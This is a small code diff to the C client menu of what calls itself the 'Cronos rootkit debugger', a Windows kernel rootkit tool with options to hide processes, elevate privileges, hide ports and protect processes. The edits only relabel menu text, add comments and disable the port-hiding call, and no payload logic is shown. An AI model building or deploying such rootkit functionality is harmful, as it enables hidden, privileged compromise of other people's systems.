@@ -16,7 +16,7 @@ int main()
 		printf(" - Cronos rootkit debugger - \n");
 		printf("1. Hide process\n");
 		printf("2. Elevate process\n");
-		printf("3. Hide port\n");
+		printf("3. Hide port (Work in progress)\n");
 		printf("4. Protect process\n");
 		printf("0. Close program\n");
 		printf("Option: ");
@@ -44,7 +44,7 @@ int main()
 				break;
 
 			case 3:
-				InitHPort();
+				//InitHPort();
 				break;
 
 			case 4:
@@ -66,7 +66,7 @@ BOOL IsProcessRunning(int pid)
 	return ret == WAIT_TIMEOUT;
 }
 
-void InitHP()
+void InitHP() //Hide process
 {
 	system("cls");
 	printf("[+] Opening handle to driver\n");
@@ -101,7 +101,7 @@ void InitHP()
 		printf("[-] Failed to hide processes\n");
 }
 
-void InitElevate()
+void InitElevate() //Process elevation
 {
 	system("cls");
 	printf("[+] Opening handle to driver\n");
@@ -167,7 +167,7 @@ void InitHPort()
 		printf("[-] Failed to hide port\n");
 }
 
-void InitProtProc()
+void InitProtProc() //Process protection
 {
 	system("cls");
 
